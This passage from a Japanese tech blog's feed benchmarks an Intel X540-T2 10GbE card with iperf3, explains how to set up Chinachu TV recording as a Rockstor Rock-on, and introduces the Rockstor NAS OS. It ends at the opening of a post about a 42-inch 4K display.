</span><span class='line'>version:        4.2.1-k
</span><span class='line'>license:        GPL
</span><span class='line'>description:    Intel(R) 10 Gigabit PCI Express Network Driver
</span><span class='line'>author:         Intel Corporation, &lt;linux.nics@intel.com&gt;
</span><span class='line'>srcversion:     E252348AB8BA33BA57DD40B
</span><span class='line'>[root@rockstor ~]#</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pve:~# modinfo ixgbe | head -6
</span><span class='line'>filename:       /lib/modules/4.4.6-1-pve/kernel/drivers/net/ethernet/intel/ixgbe/ixgbe.ko
</span><span class='line'>version:        4.3.15
</span><span class='line'>license:        GPL
</span><span class='line'>description:    Intel(R) 10 Gigabit PCI Express Network Driver
</span><span class='line'>author:         Intel Corporation, &lt;linux.nics@intel.com&gt;
</span><span class='line'>srcversion:     7AED484083B2C5B86424A3A
</span><span class='line'>root@pve:~#</span></code></pre></td></tr></table></div></figure>


<p>Rockstor(CentOS 7.2)ではバージョン4.2.1、ProxMox(Debian 8.2)ではバージョン4.3.15のようですね</p>

<h3>ドライバ導入</h3>

<p>そのままで認識してくれましたが、せっかくなので最新のドライバを導入します。
執筆時点の最新のドライバは4.3.15なので、ProxMoxは最新版が搭載されているようです。
Rockstorのドライバをアップデートするため、
Intelから最新のドライバを拾ってきて、<code>tar xf &amp;&amp; make &amp;&amp; make install</code>するだけの簡単なお仕事でした。</p>

<p><a href="https://downloadcenter.intel.com/download/14687/PCI-E-10-Linux-">Download Network Adapter Driver for PCI-E<em> Intel® 10 Gigabit Ethernet Network Connections under Linux</em></a></p>

<h1>検証</h1>

<p>こんなに安くてはたしてしっかり動くのか、そこが問題です。</p>

<h2>検証環境</h2>

<p>構成は前章のセットアップの節に同じ。
Aの仮想マシン動かしてるやつをクライアント、BのNASをサーバとします。
IPアドレスは、Aを172.28.0.2/24、Bを172.28.0.3/24として設定します。</p>

<h2>検証内容</h2>

<h3>単線通信速度測定</h3>

<p>iperf3を使って片方のポートに接続したLANケーブルで通信してTCPによる転送速度を測定します。
5回測定して偏りがなければ、3回目の結果を例としてあげます。</p>

<h3>リンクアグリゲーション通信速度測定</h3>

<p>デュアルポートを束ねてリンクアグリゲーションし、論理20Gbpsを構成してiperf3で通信速度を測定します。
リンクアグリゲーションの構成方法はクライアント・サーバともに同じとし、クライアント側での設定例を以下に示します。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pve:~# modprobe bonding
</span><span class='line'>root@pve:~# ip addr add 172.28.0.3/24 brd + dev bond0
</span><span class='line'>root@pve:~# ip link set dev bond0 up
</span><span class='line'>root@pve:~# ifenslave bond0 eth2 eth3</span></code></pre></td></tr></table></div></figure>


<p>5回測定して偏りがなければ、3回目の結果を例としてあげます。</p>

<h3>消費電力</h3>

<p>AのXeonマシンにおいて、以下の4状態を10秒間ワットチェッカーで測定した結果の平均値を求めます。</p>

<ul>
<li>X540-T2未搭載でのアイドル時消費電力</li>
<li>X540-T2搭載した状態でのアイドル時消費電力</li>
<li>X540-T2搭載した状態でiperf3単線通信速度測定時の消費電力</li>
<li>X540-T2搭載した状態でiperf3リンクアグリゲーション通信速度測定時の消費電力</li>
</ul>


<h2>結果</h2>

<h3>単線通信速度測定</h3>

<p>iperf3で5回計測した結果、偏りは生じませんでした。
平均的な数値としては、単線では帯域幅が<strong>9.38Gbps</strong>出るといった結果となりました。
以下に、3回目の結果を示します。</p>

<h4>クライアント側</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pve:~# iperf3 -c 172.28.0.2 0B 172.28.0.3
</span><span class='line'>Connecting to host 172.28.0.2, port 5201
</span><span class='line'>[  4] local 172.28.0.3 port 59914 connected to 172.28.0.2 port 5201
</span><span class='line'>[ ID] Interval           Transfer     Bandwidth       Retr  Cwnd
</span><span class='line'>[  4]   0.00-1.00   sec  1.10 GBytes  9.41 Gbits/sec   10    624 KBytes
</span><span class='line'>[  4]   1.00-2.00   sec  1.09 GBytes  9.40 Gbits/sec    0    672 KBytes
</span><span class='line'>[  4]   2.00-3.00   sec  1.09 GBytes  9.40 Gbits/sec    0    676 KBytes
</span><span class='line'>[  4]   3.00-4.00   sec  1.09 GBytes  9.36 Gbits/sec    0    687 KBytes
</span><span class='line'>[  4]   4.00-5.00   sec  1.09 GBytes  9.41 Gbits/sec    0    694 KBytes
</span><span class='line'>[  4]   5.00-6.00   sec  1.09 GBytes  9.41 Gbits/sec    7    615 KBytes
</span><span class='line'>[  4]   6.00-7.00   sec  1.08 GBytes  9.31 Gbits/sec   11    609 KBytes
</span><span class='line'>[  4]   7.00-8.00   sec  1.06 GBytes  9.11 Gbits/sec    0    755 KBytes
</span><span class='line'>[  4]   8.00-9.00   sec  1.04 GBytes  8.95 Gbits/sec    0    860 KBytes
</span><span class='line'>[  4]   9.00-10.00  sec  1.05 GBytes  9.01 Gbits/sec    0    887 KBytes
</span><span class='line'>- - - - - - - - - - - - - - - - - - - - - - - - -
</span><span class='line'>[ ID] Interval           Transfer     Bandwidth       Retr
</span><span class='line'>[  4]   0.00-10.00  sec  10.8 GBytes  9.28 Gbits/sec   28             sender
</span><span class='line'>[  4]   0.00-10.00  sec  10.8 GBytes  9.27 Gbits/sec                  receiver
</span><span class='line'>
</span><span class='line'>iperf Done.</span></code></pre></td></tr></table></div></figure>


<h4>サーバ側</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@rockstor ~]# iperf3 -s -B 172.28.0.2
</span><span class='line'>-----------------------------------------------------------
</span><span class='line'>Server listening on 5201
</span><span class='line'>-----------------------------------------------------------
</span><span class='line'>Accepted connection from 172.28.0.3, port 59912
</span><span class='line'>[  5] local 172.28.0.2 port 5201 connected to 172.28.0.3 port 59914
</span><span class='line'>[ ID] Interval           Transfer     Bandwidth
</span><span class='line'>[  5]   0.00-1.00   sec  1.05 GBytes  9.03 Gbits/sec
</span><span class='line'>[  5]   1.00-2.00   sec  1.09 GBytes  9.39 Gbits/sec
</span><span class='line'>[  5]   2.00-3.00   sec  1.09 GBytes  9.40 Gbits/sec
</span><span class='line'>[  5]   3.00-4.00   sec  1.09 GBytes  9.36 Gbits/sec
</span><span class='line'>[  5]   4.00-5.00   sec  1.10 GBytes  9.41 Gbits/sec
</span><span class='line'>[  5]   5.00-6.00   sec  1.09 GBytes  9.40 Gbits/sec
</span><span class='line'>[  5]   6.00-7.00   sec  1.09 GBytes  9.34 Gbits/sec
</span><span class='line'>[  5]   7.00-8.00   sec  1.06 GBytes  9.11 Gbits/sec
</span><span class='line'>[  5]   8.00-9.00   sec  1.04 GBytes  8.93 Gbits/sec
</span><span class='line'>[  5]   9.00-10.00  sec  1.05 GBytes  9.00 Gbits/sec
</span><span class='line'>[  5]  10.00-10.04  sec  43.1 MBytes  9.41 Gbits/sec
</span><span class='line'>- - - - - - - - - - - - - - - - - - - - - - - - -
</span><span class='line'>[ ID] Interval           Transfer     Bandwidth
</span><span class='line'>[  5]   0.00-10.04  sec  0.00 Bytes  0.00 bits/sec                  sender
</span><span class='line'>[  5]   0.00-10.04  sec  10.8 GBytes  9.24 Gbits/sec                  receiver</span></code></pre></td></tr></table></div></figure>


<h3>リンクアグリゲーション通信速度測定</h3>

<p>iperf3で5回計測した結果、偏りは生じませんでした。
平均的な数値としては、リンクアグリゲーションでは帯域幅が<strong>14.4Gbps</strong>出るといった結果となりました。
以下に、3回目の結果を示します。</p>

<h4>クライアント側</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pve:~# iperf3 -c 172.28.0.2 -B 172.28.0.3
</span><span class='line'>Connecting to host 172.28.0.2, port 5201
</span><span class='line'>[  4] local 172.28.0.3 port 54549 connected to 172.28.0.2 port 5201
</span><span class='line'>[ ID] Interval           Transfer     Bandwidth       Retr  Cwnd
</span><span class='line'>[  4]   0.00-1.00   sec  1.67 GBytes  14.3 Gbits/sec    9    677 KBytes
</span><span class='line'>[  4]   1.00-2.00   sec  1.68 GBytes  14.5 Gbits/sec    0    682 KBytes
</span><span class='line'>[  4]   2.00-3.00   sec  1.69 GBytes  14.5 Gbits/sec  165    684 KBytes
</span><span class='line'>[  4]   3.00-4.00   sec  1.72 GBytes  14.8 Gbits/sec    2    773 KBytes
</span><span class='line'>[  4]   4.00-5.00   sec  1.66 GBytes  14.2 Gbits/sec  106    557 KBytes
</span><span class='line'>[  4]   5.00-6.00   sec  1.62 GBytes  13.9 Gbits/sec   29    472 KBytes
</span><span class='line'>[  4]   6.00-7.00   sec  1.68 GBytes  14.5 Gbits/sec   15    840 KBytes
</span><span class='line'>[  4]   7.00-8.00   sec  1.63 GBytes  14.0 Gbits/sec   42    587 KBytes
</span><span class='line'>[  4]   8.00-9.00   sec  1.66 GBytes  14.2 Gbits/sec   94    710 KBytes
</span><span class='line'>[  4]   9.00-10.00  sec  1.62 GBytes  13.9 Gbits/sec   15    710 KBytes
</span><span class='line'>- - - - - - - - - - - - - - - - - - - - - - - - -
</span><span class='line'>[ ID] Interval           Transfer     Bandwidth       Retr
</span><span class='line'>[  4]   0.00-10.00  sec  16.6 GBytes  14.3 Gbits/sec  477             sender
</span><span class='line'>[  4]   0.00-10.00  sec  16.6 GBytes  14.3 Gbits/sec                  receiver
</span><span class='line'>
</span><span class='line'>iperf Done.</span></code></pre></td></tr></table></div></figure>


<h4>サーバ側</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@rockstor ~]# iperf3 -s -B 172.28.0.2
</span><span class='line'>-----------------------------------------------------------
</span><span class='line'>Server listening on 5201
</span><span class='line'>-----------------------------------------------------------
</span><span class='line'>Accepted connection from 172.28.0.3, port 54615
</span><span class='line'>[  5] local 172.28.0.2 port 5201 connected to 172.28.0.3 port 54549
</span><span class='line'>[ ID] Interval           Transfer     Bandwidth
</span><span class='line'>[  5]   0.00-1.00   sec  1.60 GBytes  13.8 Gbits/sec
</span><span class='line'>[  5]   1.00-2.00   sec  1.68 GBytes  14.4 Gbits/sec
</span><span class='line'>[  5]   2.00-3.00   sec  1.69 GBytes  14.5 Gbits/sec
</span><span class='line'>[  5]   3.00-4.00   sec  1.72 GBytes  14.8 Gbits/sec
</span><span class='line'>[  5]   4.00-5.00   sec  1.66 GBytes  14.2 Gbits/sec
</span><span class='line'>[  5]   5.00-6.00   sec  1.62 GBytes  13.9 Gbits/sec
</span><span class='line'>[  5]   6.00-7.00   sec  1.67 GBytes  14.3 Gbits/sec
</span><span class='line'>[  5]   7.00-8.00   sec  1.64 GBytes  14.1 Gbits/sec
</span><span class='line'>[  5]   8.00-9.00   sec  1.66 GBytes  14.2 Gbits/sec
</span><span class='line'>[  5]   9.00-10.00  sec  1.62 GBytes  13.9 Gbits/sec
</span><span class='line'>[  5]  10.00-10.04  sec  62.2 MBytes  14.1 Gbits/sec
</span><span class='line'>- - - - - - - - - - - - - - - - - - - - - - - - -
</span><span class='line'>[ ID] Interval           Transfer     Bandwidth
</span><span class='line'>[  5]   0.00-10.04  sec  0.00 Bytes  0.00 bits/sec                  sender
</span><span class='line'>[  5]   0.00-10.04  sec  16.6 GBytes  14.2 Gbits/sec                  receiver</span></code></pre></td></tr></table></div></figure>


<h3>消費電力</h3>

<p>4状態における消費電力は以下の通りとなりました。</p>

<table>
<thead>
<tr>
<th style="text-align:left;">状態</th>
<th style="text-align:right;">消費電力</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;"> 未搭載アイドル時</td>
<td style="text-align:right;"> 38 W</td>
</tr>
<tr>
<td style="text-align:left;"> 搭載済みアイドル時 </td>
<td style="text-align:right;"> 51 W</td>
</tr>
<tr>
<td style="text-align:left;"> 単線通信時 </td>
<td style="text-align:right;"> 63 W</td>
</tr>
<tr>
<td style="text-align:left;"> リンクアグリゲーション通信時 </td>
<td style="text-align:right;"> 68 W</td>
</tr>
</tbody>
</table>


<h1>まとめ</h1>

<p>X540-T2は買いである。</p>

<p><a href="https://www.amazon.co.jp/intel-X540T2-X540-T2/dp/B0077CS9UM/ref=sr_1_1?ie=UTF8&amp;qid=1467713812&amp;sr=8-1&amp;tag=mzyy-22">Amazon.co.jp： intel X540-T2: パソコン・周辺機器</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[RockstorにChinachuを詰め込んで録画NAS作ろ]]></title>
    <link href="http://mzyy94.com/blog/2016/07/05/chinachu-rockon/"/>
    <updated>2016-07-05T00:07:31+09:00</updated>
    <id>http://mzyy94.com/blog/2016/07/05/chinachu-rockon</id>
    <content type="html"><![CDATA[<p><a href="https://mzyy94.com/blog/2016/07/04/do-you-know-rockstor/">昨日紹介したRockstor</a>というNAS用OS、とても便利で快適に使っています。
今まで低消費電力で非力なマシンで動作させていたNASもCore i5で動作するようになり、
もっといろいろとやらせてみたくなりました。
余裕がありそうなので、録画サーバの役割も担ってもらい、録画NASとして我が家で働いてもらいます。</p>

<!-- more -->


<h2>Rockstor</h2>

<p>昨日の記事でいろいろと紹介しましたが、見る気がない人・ちょっとだけ知っているから見ない人向けにRockstorとは何ぞやを説明すると、
CentOSベースのBtrfsを採用したDockerが載ったNAS用OSです。Dockerが載ってるのはアプリケーションをコンテナの中で
実行させることができるようにする仕組みであるRock-onsのためのものであり、このRock-onsを利用することで
標準でリストアップされてるRock-onであれば、ボタン一つでアプリケーションをインストールすることが可能なのです。
ここで強調したいのは、<em>標準でリストアップされているものであればボタン一つでインストール</em>できるという話で、
標準でリストアップされていないものはボタン操作に加えて<strong>数行のコマンド操作をするだけでインストールができる</strong>といった
隠れた拡張性があるという点です。</p>

<h2>Chinachu</h2>

<p>さて、話題を変えて録画といえばの話。録画といえば過去いろいろなところで何度も紹介しているLinux向けDVR（Digital Video Recorder)
アプリケーションである<a href="https://github.com/kanreisa/Chinachu">Chinachu</a>が快適で使い勝手がよいと評判です。
動作させてからの操作は快適なのですが、動作させるまでがいろいろと面倒くさかったりします。
例えば地上デジタル放送・衛星放送キャプチャボードであるPT3のドライバの導入。初回はもちろんのこと、OSのアップグレードごとに
カーネルモジュールをビルドしてインストールしてなどと、
録画環境を構築する前段階で難しい処理が挟まるのが少々玉に瑕です。
しかし、ドライバなどの環境を整えた後のChinachu自体のセットアップはある程度簡単にできるようになっています。
それどころか、チューナー管理アプリケーションのMirakurun連携とB-CASカードの読み込みまで含めたChinachuの動作環境を、
<strong>Dockerに押し込めてコマンド一発ですべて仕上がる</strong>ようにしたリポジトリがあるくらいに簡単です。</p>

<p><a href="https://github.com/h-mineta/docker-mirakurun-chinachu">h-mineta/docker-mirakurun-chinachu: All in one Mirakurun &amp; Chinachu</a></p>

<h2>PT3 DVBドライバ</h2>

<p>みなが苦労するPT3のドライバの導入作業あれこれに終止符を打つかのように、Linuxカーネルが標準でPT3のドライバを搭載してきました。
DVB(Digital Video Broadcasting)ドライバと呼ばれるそれは、チューナーからの信号をスペシャルファイル経由で簡易に取り出せる機能を
もったもので、このドライバが有効化されているディストリビューションでは先述のようなPT3ドライバの導入に苦戦しなくても放送波を取得
できるようになっているのです。なんとこのドライバ、<strong>Rockstorでは標準で有効</strong>になっており、PT3をマシンに搭載するだけで動作するのです！</p>

<h2>Chinachu Rock-on</h2>

<p>セクションタイトルを見て気づいている人も多いと思いますが、これまでに挙げた3つの事柄が組み合わさって、数行のコマンド入力とクリックだけで動作させられるChinachu rock-onが出来上がってしまいます。</p>

<ol>
<li>新しいRock-onは実は自由に追加できる</li>
<li>ChinachuのDockerイメージがある</li>
<li>PT3のドライバは導入済み</li>
</ol>


<p>これらをいい感じにまとめてRock-onを作成しました。</p>

<p><a href="https://github.com/mzyy94/Chinachu-rockon"><strong>mzyy94/Chinachu-rockon</strong></a></p>

<p>Rock-onはJSONで書かれたRock-onファイルの記述形式に沿った形で自作することで、新たなRock-onを作り上げることができるようになっています。
- Ref. <a href="https://github.com/rockstor/rockon-registry">https://github.com/rockstor/rockon-registry</a></p>

<p>ここのREADMEにあるように、決まった形で書くことでポートの転送や共有ディレクトリの設定、
Docker hubのイメージ取得を自動化し、アプリケーションを実行できます。</p>

<p>ChinachuのDockerfileがあるので、これをDVB版のPT3ドライバで動作するように書き換え、かつRock-onのファイル共有方法に適した方法で設定ファイルなどを管理できるように変更してDocker hubにプッシュしてRock-onを完成させました。</p>

<h2>Chinachu Rock-on のインストール</h2>

<p>大前提として、RockstorをインストールしたマシンにPT3とSmartCardリーダーが接続されていることとして話を進めます。</p>

<p>冒頭でも述べたように、標準でリストアップされているRock-onであればボタン一つで起動できますが、リストアップされていないものに関してはコマンド入力が必要となります。
この点において、Rock-onsは超お手軽と手放しで喜べない部分ではありますが、普通にChinachuをセットアップするよりは数倍は楽になっていると思うので我慢してください。
Chinachu-rockonのリポジトリのREADMEにも書いてありますが、必要な作業は</p>

<ol>
<li>chinachu.jsonをダウンロード</li>
<li>rock-ons metastoreディレクトリを作成</li>
<li>Rockstorにchinachu.jsonを転送</li>
<li>Rock-onサービスが起動してなかったら起動する</li>
<li>Rock-onsのUpdateをする</li>
<li>Chinachuとチューナ管理アプリケーションのMirakurunの設定場所と録画の保存先の共有ディレクトリを作成する</li>
<li>Chinachu Rock-onを起動する</li>
</ol>


<p>となっています。
chinachu.jsonは<a href="https://github.com/mzyy94/Chinachu-rockon/releases">こちら</a>にあるので適当にダウンロードしてもらって、
ダウンロードしたディレクトリで以下のコマンドを実行するとステップ3まで終了します。your-rockstor-ipはRockstorに割り当てられたIPアドレスに変更して、パスワードを求められたらRockstorのrootパスワードを入力して実行してください。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@your-rockstor-ip mkdir /opt/rockstor/rockons-metastore
</span><span class='line'>scp chinachu.json root@your-rockstor-ip:/opt/rockstor/rockons-metastore</span></code></pre></td></tr></table></div></figure>


<p>そしてRock-onsのサービスが起動してなかったら起動し、その後Updateボタンを押すと、Chinachuがリストアップされてきます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/05/chinachu-rockon-listed.png" alt="Listed up" /></p>

<p>Rock-onsの一覧にChinachuが現れてもあわててインストールせずに、
ChinachuとMirakurunの設定ファイルと録画を保存する共有ディレクトリを作成します。
ここで重要なのは、Chinachu関連のディレクトリとMirakurun関連のディレクトリは必ず別の共有ディレクトリを作成する必要があるというところです。
ChinachuのデータとMirakurunのデータが衝突してうまく動作しなくなります。
逆を言えば、Chinachuの設定とデータは同じディレクトリにしてもいいですし、Mirakurunの設定とデータベースも同じディレクトリにしてOKです。
また、録画ファイル保存ディレクトリは大容量必要ですが、それ以外は1GBもあれば十分でしょう。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/05/created-shares.png" alt="Created share" /></p>

<p>共有ディレクトリの作成が済んだらChinachuのインストールをしましょう。
インストールといっても設定する項目はほとんどなく、設定する必要のあるのは以下の5つの共有ディレクトリの指定だけです。</p>

<ul>
<li><strong>[Chinachu Config Storage]</strong> Chinachuの設定ファイル保存ディレクトリ</li>
<li><strong>[Chinachu Data Storag]</strong> Chinachuのデータ保存ディレクトリ</li>
<li><strong>[Mirakurun Config Storage]</strong> Mirakurunの設定ファイル保存ディレクトリ</li>
<li><strong>[Mirakurun Database Storage]</strong> Mirakurunのデータベース保存ディレクトリ</li>
<li><strong>[Recording Storage]</strong> 録画ファイル保存ディレクトリ</li>
</ul>


<p>それぞれ先ほど作成した共有ディレクトリを指定し、ポート番号の設定はデフォルトのままでステップを進めていき、インストールは完了です。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/05/install-step-1.png" alt="Install step 1" />
<img src="http://mzyy94.com/blog/resources/images/2016/07/05/install-step-2.png" alt="Install step 2" />
<img src="http://mzyy94.com/blog/resources/images/2016/07/05/install-step-3.png" alt="Install step 3" /></p>

<p>チャンネル設定などが適当なのでChinachuとMirakurunの設定ファイルを保存した共有ディレクトリにあるchannels.ymlやconfig.jsonを編集してChinachuを再起動させて完成です。
録画ファイル保存ディレクトリをAFPで共有したり、各々のChinachuライフを快適にお過ごしください。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NAS用OSにRockstorという選択]]></title>
    <link href="http://mzyy94.com/blog/2016/07/04/do-you-know-rockstor/"/>
    <updated>2016-07-04T20:12:14+09:00</updated>
    <id>http://mzyy94.com/blog/2016/07/04/do-you-know-rockstor</id>
    <content type="html"><![CDATA[<p>みなさんはNASのOSとして何を使っていますか？
FreeNAS、OpenMediaVault、巷にはいくつもOSSのNAS用OSがあります。
なにを選んだらいいのでしょう？</p>

<p>少し前までは非力なAtomサーバ機にNAS4Freeを入れて使っていましたが、PCでゲームをすることが
ほとんどなくなったので、GameStreamサーバ(旧メインサーバー)を解体してNASとして稼働させることにしました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/4/6/Servers.jpg" alt="図：古いマシン構成の図" /></p>

<p>NAS4Freeを使っていた理由はAtomサーバ機に搭載されている256MBフラッシュメモリにOSが焼き込め、
ある程度長期の運用に向いているだろうという直感で決めていました。</p>

<p>旧GameStreamサーバを解体したため、GPUは取り外したもののSandy世代のi5が載っており、
今までのAtom 330とは段違いの性能があります。
せっかくなのでココは冒険と、RockstorなるNAS用OSを導入してみました。</p>

<!-- more -->


<h2>Rockstorとは</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/04/rockstor-dashboard.png" alt="Dashboard" /></p>

<p><a href="http://rockstor.com/">Rockstor</a>とは、Rockstor, Inc.が開発・サポートをしているオープンソースの
NAS用OSです。多々あるNAS用OSと同じWebからの操作形態となっていますが、機能を盛り込みすぎて
ごたごたしている今どきのNAS用OSの操作画面とは真逆を行っていて、簡潔さと美しさで
UXの面では他を抜いて抜群に優れているインターフェースです。操作性のために情報量を犠牲にしていることは決してなく、
ダッシュボードに表示される情報は見ているだけでもうっとりくるような仕上がりとなっています。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/04/rockstor-services.png" alt="Services" /></p>

<p>NAS用OSとうたっているだけあって、標準でSFTP・SMB・AFPなどのファイル共有プロトコル
のサービスがインストールされていて、共有するフォルダを選択するだけでNASと化すすぐれものです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/04/rockstor-shares.png" alt="Shares" /></p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/04/rockstor-file-sharing.png" alt="File sharing" /></p>

<p>ベースとなるOSは、古くからNAS用OSのトップを走ってきたFreeNASを中心とした
FreeBSDベースとは違って、そこからフォークしたOpenMediaVaultと同じLinuxベースとなっています。
OpenMediaVaultがDebianディストリビューションをベースとしている中、このRockstorはCentOSをベースと
しています。個人的なLinuxディストリビューションの宗派はDebianなので、ベースOSの違いで
このRockstorを選んだわけではさらさらなく、Rockstorに搭載されている
FreeNASに負けず劣らずの強力な機能に惹かれてしまったのです。</p>

<h2>Btrfsの採用</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/04/rockstor-pools.png" alt="Pools" /></p>

<p>FreeNASはFreeBSDの血を色濃く残しており、ファイルシステムはZFSを標準としています。
FreeNASを使っていたころ、ZFSのRAID-Zに<del>親を殺されて</del>ディスクを抹消されてからいい印象がなかったため、
NAS4FreeではUFSで運用していました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/04/rockstor-snapshot.png" alt="Snap shot" /></p>

<p>UFSではスナップショットの作成がままならなかったり、冗長性の面で不安なこともあり、なにかそういった点で
特徴のあるファイルシステムが使いたいところでした。その希望にぴたりとあてはまっていたのがこのRockstor
が採用するBtrfs。詳しいことはよくわからないですが、とにかくすごいのです。どれくらいすごいのか
言葉で表すのは難しいのですが、ファイルを書き込むときにプラッタにしみこんでいく感覚が伝わってくると思います。
<del>くわしい情報は<a href="https://twitter.com/naota344">こちら</a>から。</del></p>

<h3>インストール時のハードディスク指定注意</h3>

<p>Btrfsをベースとしていますが、標準のオートパーティション分割ではLVMを構成してしまってインストール後の起動でBtrfsにインストールしろと怒られるので、インストール時のストレージ選択でI will configure partitioning.を選ぶといいです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/04/install-manual-partitioning1.png" alt="Install into btrfs" />
<img src="http://mzyy94.com/blog/resources/images/2016/07/04/install-manual-partitioning2.png" alt="Install into btrfs" /></p>

<h2>Rock-onsという名のDockerアプリケーション環境</h2>

<p>Rockstorの旨みはBtrfs採用でファイル共有ができるNASというところにとどまりません。
アプリケーションの追加を手軽に行うRock-onsと呼ばれる機能があるのです。
Rock-onsは、アプリケーションをDockerコンテナで実行し、Rockstorの環境を汚すことなく
様々な機能を<strong>ボタン一つで</strong>追加する機能です。
FreeNASにもJailとしてアプリケーションをコンテナに押し込む方法がありますが、コマンド入力が多々必要だったり、
そもそも設定するためにメニューを探してはさまざまな情報を入力させられるなど、手軽とは言い難いものです。
対してRock-onsは、あらかじめRock-onsレジストリに登録されたアプリケーションしか標準では実行できないものの、
登録されているアプリケーションであればボタン一つでポチポチと進めていくだけでアプリケーションを動作
させることができるのです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/04/rockstor-rockons.png" alt="Rock-ons" /></p>

<p>例えばGitLab CE Rock-onでは、リポジトリの保存先などを設定していくだけで、
Rock-ons上、すなわちNASのDocker上で軽々とGitLab CEを動作させることができます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/04/rockstor-rockons-installed.png" alt="Rock-ons installed" /></p>

<h2>まとめ</h2>

<p>Webからの操作では自由度に制限があるものの、これくらい手軽でないとせっかくNAS用OSとして登場
してきているのにCentOSを素手で触ったほうがマシと感じることもあるでしょう。Rockstor、めんどくさがり家のあなたにどうですか？</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[42インチのAH-IPS 4Kディスプレイ買ってみた]]></title>
    <link href="http://mzyy94.com/blog/2016/01/10/42inch-4k-display/"/>
    <updated>2016-01-10T05:00:00+09:00</updated>
    <id>http://mzyy94.com/blog/2016/01/10/42inch-4k-display</id>
    <content type="html"><![CDATA[<p>年が明け、2016年。27インチのWQHD(2560x1440)ディスプレイを使い続けていたものの、情報量が少ないことが気になり始めました。
2年ほど前から使い始めていたDELLのU2713HM自体には大きな不満もなかったものの、巷で聞こえる「4Kはいいぞ」の声に触発されて徐々に不満を感じ始めました。
年も変わるのでこの機にがらっと入れ替えてしまおうと思い、WQHDからUHD(4K)に買い換えました。</p>

<p>年末年始を費やして情報を集め、とある4Kディスプレイを買うまでの話、買ったあとの満足度を伝えていきます。</p>

<!-- more -->


<h2>情報量の多い4K</h2>

<p>4Kディスプレイはいろいろなメーカーが展開しており、いくつも選択肢があります。
